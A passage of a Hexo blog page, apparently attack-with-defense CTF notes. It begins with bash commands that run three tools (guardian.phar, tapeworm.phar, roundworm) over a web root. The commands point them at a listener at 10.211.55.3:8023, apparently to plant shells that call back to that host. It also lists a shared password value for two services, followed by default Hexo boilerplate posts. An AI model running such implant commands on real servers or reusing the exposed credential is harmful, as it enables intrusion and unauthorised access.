+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x guardian.phar</span><br><span class="line"><span class="built_in">chmod</span> +x tapeworm.phar</span><br><span class="line"><span class="built_in">chmod</span> +x roundworm</span><br><span class="line"></span><br><span class="line">./guardian.phar -i /var/www/html -s 10.211.55.3:8023</span><br><span class="line">./tapeworm.phar -d /var/www/html -s 10.211.55.3:8023</span><br><span class="line">./roundworm  -w /var/www/html -s 10.211.55.3 -p 8023 -d</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="密码"><a href="#密码" class="headerlink" title="密码"></a>密码</h1><ol>
+<li><p>上weblogger</p>
+<p>高旭东负责，密码：<code>b565769ffbfe776234873fa18cc8b8a2</code></p>
+</li>
+<li><p>上watchbird</p>
+<p>高旭东负责，密码：<code>b565769ffbfe776234873fa18cc8b8a2</code></p>
+</li>
+</ol>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+    <article id="post-test" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2023/06/01/test/" class="article-date">
+  	<time datetime="2023-06-01T02:36:48.000Z" itemprop="datePublished">2023-06-01</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2023/06/01/test/">
+        test
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+    <article id="post-hello-world" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2023/05/31/hello-world/" class="article-date">
+  	<time datetime="2023-05-31T15:31:18.061Z" itemprop="datePublished">2023-05-31</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2023/05/31/hello-world/">
+        Hello World
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+  
+    <nav id="page-nav">
+      <a class="extend prev" rel="prev" href="/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
+    </nav>
+  
+</div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+      <div class="footer-left">
+        &copy; 2023 John Doe
+      </div>
+        <div class="footer-right">
+          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/smackgg/hexo-theme-smackdown" target="_blank">Smackdown</a>
+        </div>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+
+
+<script>
+	var yiliaConfig = {
+		fancybox: true,
+		mathjax: true,
+		animate: true,
+		isHome: true,
+		isPost: false,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: false
+	}
+</script>
+
+<script src="/js/main.js"></script>
+
+
+
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+    tex2jax: {
+        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+        processEscapes: true,
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+});
+
+MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';                 
+    }       
+});
+</script>
+
+<script src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js"></script>
+
+
+  </div>
+</body>
+</html>
